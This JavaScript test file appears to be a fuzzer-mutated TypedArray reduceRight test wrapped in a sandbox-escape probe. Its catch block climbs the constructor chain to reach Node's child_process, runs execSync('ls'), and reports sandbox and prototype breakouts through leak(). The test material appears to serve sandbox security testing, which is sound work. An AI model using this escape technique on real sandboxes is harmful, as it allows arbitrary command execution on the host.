try {
    testWithBigIntTypedArrayConstructors(function (TA) {
        let REPLACER = 23;
        var sample = new TA(1);
        assert.throws(TypeError, function () {
            throw () => {
                return () => {
                };
            };
            sample.reduceRight();
        }, 'no arg');
        assert.throws(TypeError, function () {
            sample.reduceRight(undefined);
        }, 'undefined');
        assert.throws(TypeError, function () {
            sample.reduceRight(null);
        }, 'null');
        assert.throws(TypeError, function () {
            sample.reduceRight({});
        }, '{}');
        assert.throws(TypeError, function () {
            sample.reduceRight(1);
        }, '1');
        assert.throws(TypeError, function () {
            sample.reduceRight(NaN);
        }, 'NaN');
        assert.throws(TypeError, function () {
            sample.reduceRight('');
        }, 'string');
        assert.throws(TypeError, function () {
            sample.reduceRight(false);
        }, 'false');
        assert.throws(TypeError, function () {
            sample.reduceRight(true);
        }, 'true');
        assert.throws(TypeError, function () {
            sample.reduceRight(Symbol(''));
        }, 'symbol');
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}